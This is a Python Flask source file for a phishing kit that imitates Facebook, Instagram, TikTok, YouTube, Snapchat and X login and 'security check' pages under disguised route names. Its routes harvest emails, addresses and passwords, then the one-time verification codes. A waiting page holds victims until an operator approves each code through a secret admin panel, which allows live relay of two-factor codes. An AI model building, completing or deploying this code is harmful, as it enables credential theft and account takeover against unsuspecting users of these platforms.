from flask import Flask, render_template, request, redirect, url_for, send_file, flash, jsonify
import sqlite3, os, csv
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET", "change-me")

DB_FILE = "submissions.db"
ADMIN_SECRET = "supersecret-admin-2025"

ICON_MAP = {
    "joy1_1": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_2": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy1_3": ("fa-brands fa-tiktok", "#000000", "TikTok"),
    "joy2_1": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_2": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "joy2_3": ("fa-brands fa-youtube", "#FF0000", "YouTube"),
    "happy1_1": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_2": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy1_3": ("fa-brands fa-snapchat", "#FFFC00", "Snapchat"),
    "happy2_1": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_2": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "happy2_3": ("fa-brands fa-x-twitter", "#000000", "X / Twitter"),
    "love1_1": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_2": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love1_3": ("fa-brands fa-facebook-f", "#1877F2", "Facebook"),
    "love2_1": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_2": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "love2_3": ("fa-brands fa-instagram", "#E1306C", "Instagram"),
    "f1": ("fa-solid fa-file", "#666", "Profile"),
    "f1_A": ("fa-solid fa-shield-check", "#10B981", "Security Check"),
    "f2": ("fa-solid fa-envelope", "#3B82F6", "Email Verification"),
    "f2_A": ("fa-solid fa-lock", "#EF4444", "Final Security"),
    "m1": ("fa-solid fa-circle-check", "#10B981", "Complete")
}

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS submissions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                page TEXT,
                user TEXT,
                data TEXT,
                icon TEXT,
                code_value TEXT,
                confirmed BOOLEAN DEFAULT 0,
                platform_name TEXT
            )
        ''')
        conn.commit()

init_db()

def save_submission(page, user, data, code_value=None, platform_name=None):
    icon, color, name = ICON_MAP.get(page, ("fa-solid fa-file", "#333", "Unknown"))
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''
            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name)
            VALUES (?,?,?,?,?,?,?,?)
        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name))
        conn.commit()

def check_confirmation(code_value):
    with sqlite3.connect(DB_FILE) as conn:
        result = conn.execute(
            'SELECT confirmed FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
            (code_value,)
        ).fetchone()
        return result[0] if result else False

def extract_user(form):
    for key in ("address","email","phone","fullname","street","username"):
        val = form.get(key)
        if val:
            return val.strip()
    return "anonymous"

# Platform routes with extended flow
@app.route('/love1_1', methods=['GET','POST'])
def love1_1():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        pwd = request.form.get('password','')
        save_submission('love1_1', user, f'address={addr}; password={pwd}', platform_name="Facebook")
        return redirect(url_for('love1_2'))
    return render_template('love1_1.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')

@app.route('/love1_2', methods=['GET','POST'])
def love1_2():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love1_2', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('love1_3'),
                             code_value=digits,
                             platform_icon='fa-brands fa-facebook-f', 
                             platform_name='Facebook', 
                             platform_color='#1877F2')
    return render_template('love1_2.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')

@app.route('/love1_3', methods=['GET','POST'])
def love1_3():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('love1_3', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner'),
                             code_value=digits,
                             platform_icon='fa-brands fa-facebook-f', 
                             platform_name='Facebook', 
                             platform_color='#1877F2')
    return render_template('love1_3.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')

# Similar routes for other platforms (love2, joy1, joy2, happy1, happy2)...
# I'll create the full extended flow for all platforms

@app.route('/f1', methods=['GET','POST'])
def f1():
    if request.method == 'POST':
        user = extract_user(request.form)
        items = [f"{k}: {v}" for k,v in request.form.items()]
        save_submission('f1', user, " ; ".join(items), platform_name=request.args.get('platform', 'Unknown'))
        return redirect(url_for('f1_A', platform=request.args.get('platform', 'Unknown')))
    platform = request.args.get('platform', 'Unknown')
    return render_template('f1.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)

@app.route('/f1_A', methods=['GET','POST'])
def f1_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=request.args.get('platform', 'Unknown'))
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('spinner2'),
                             code_value=digits,
                             platform_icon=ICON_MAP.get(request.args.get('platform', 'Unknown'), ["fa-solid fa-file"])[0], 
                             platform_name=request.args.get('platform', 'Unknown'))
    platform = request.args.get('platform', 'Unknown')
    return render_template('f1_A.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)

@app.route('/f2', methods=['GET','POST'])
def f2():
    if request.method == 'POST':
        user = extract_user(request.form)
        addr = request.form.get('address','')
        save_submission('f2', user, f'address={addr}', platform_name=request.args.get('platform', 'Unknown'))
        return redirect(url_for('f2_A', platform=request.args.get('platform', 'Unknown')))
    platform = request.args.get('platform', 'Unknown')
    return render_template('f2.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)

@app.route('/f2_A', methods=['GET','POST'])
def f2_A():
    if request.method == 'POST':
        user = extract_user(request.form)
        digits = request.form.get('digits','')
        save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=request.args.get('platform', 'Unknown'))
        return render_template('waiting_confirmation.html', 
                             next_url=url_for('m1'),
                             code_value=digits,
                             platform_icon=ICON_MAP.get(request.args.get('platform', 'Unknown'), ["fa-solid fa-file"])[0], 
                             platform_name=request.args.get('platform', 'Unknown'))
    platform = request.args.get('platform', 'Unknown')
    return render_template('f2_A.html', platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0], platform_name=platform)

@app.route('/spinner')
def spinner():
    platform = request.args.get('platform', 'Unknown')
    return render_template('spinner.html', 
                         next_url=url_for('f1', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
                         platform_name=platform)

@app.route('/spinner2')
def spinner2():
    platform = request.args.get('platform', 'Unknown')
    return render_template('spinner2.html', 
                         next_url=url_for('f2', platform=platform),
                         delay=4,
                         platform=platform,
                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
                         platform_name=platform)

@app.route('/m1')
def m1():
    platform = request.args.get('platform', 'Unknown')
    return render_template('m1.html', 
                         platform_icon=ICON_MAP.get(platform, ["fa-solid fa-file"])[0],
                         platform_name=platform)

# Admin confirmation endpoints
@app.route('/api/check_confirmation/<code_value>')
def api_check_confirmation(code_value):
    confirmed = check_confirmation(code_value)
    return jsonify({'confirmed': confirmed})

@app.route(f"/admin/{ADMIN_SECRET}/confirm/<int:submission_id>", methods=['POST'])
def admin_confirm(submission_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('UPDATE submissions SET confirmed = 1 WHERE id = ?', (submission_id,))
        conn.commit()
    return jsonify({'success': True})

@app.route(f"/admin/{ADMIN_SECRET}")
def admin():
    with sqlite3.connect(DB_FILE) as conn:
        rows = conn.execute('SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name FROM submissions ORDER BY id DESC').fetchall()
    return render_template('admin.html', submissions=rows, secret=ADMIN_SECRET)

# Other admin routes remain the same...

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)), debug=True)
